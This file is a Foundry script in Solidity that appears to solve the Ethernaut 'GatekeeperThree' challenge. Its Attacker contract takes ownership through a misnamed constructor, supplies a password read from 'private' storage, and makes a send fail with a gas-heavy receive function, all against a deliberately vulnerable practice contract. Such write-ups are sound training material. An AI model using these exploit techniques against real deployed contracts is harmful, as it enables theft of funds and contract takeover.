// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperThree} from "../src/GatekeeperThree.sol";   

contract Attacker {

    GatekeeperThree private gatekeeper;

    constructor(address payable _target) payable {
        gatekeeper = GatekeeperThree(_target);

        // gateOne
        // Attacker contract is now the owner
        // tx.origin is the wallet from which we've initialized the transaction, so they are different
        gatekeeper.construct0r();   

        // gateTwo
        // The password in SimpleTrick is stored at slot 2. We use cast storage <addr> - --rpc-url
        // SLOT 0 GatekeeperThree public target; this is a contract type that occupies 32 bytes
        // SLOT 1 address public trick; this is address that occupies 20 bytes
        // SLOT 2 uint256 private password; since SLOT is 20 bytes and password is 32 bytes, password needs a whole new 
        // slot for itself
        // Tha password is smth like 0x0000000000000000000000000000000000000000000000000000000066f970b0
        // Then we cast the password to type uint256 and pass it to getAllowance
        gatekeeper.getAllowance(uint256(0x66f970b0));

        // gateThree
        // We have to sent 0.002 to GatekeeperThree in order to pass through address(this).balance > 0.001
        (bool sent, ) = address(gatekeeper).call{value: 2e15}("");
        require(sent, "Couldn't send ether");
    }

    // Bypass gateOne
    // The receive() method is only invoked for transfers happening after the contract is fully deployed and operational
    function enter() external {
        gatekeeper.enter();
    }

    // gateThree
    // send must return false for the reason we:
    // 1. Make our receive function to require more than 2300 gas 
    // 2. Can just not impelement receive or fallback functions
    receive() external payable {
        for (uint8 i = 1; i < 100; i++) {}
    }
}

contract GatekeeperThreeScript is Script {

    GatekeeperThree public gatekeeper = GatekeeperThree(payable(0x862B3E9b4d5d299DBd45038C9c8e5e3C2F968b41));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // We need to initialize new SimpleTrick first.
        gatekeeper.createTrick();

        // We need to get the address of the SimpleTrick contract we've initialized in order the check the storage slots
        address trickAddr = address(gatekeeper.trick());
        console.log(trickAddr);

        // We deploy the Attacker contract with 0.001 because we will need to transfer ethers to GatekeeperThree
        Attacker attacker = new Attacker{value: 2e15}(payable(address(gatekeeper)));
        attacker.enter();

        console.log("entrant", gatekeeper.entrant());

        vm.stopBroadcast();
    }
}
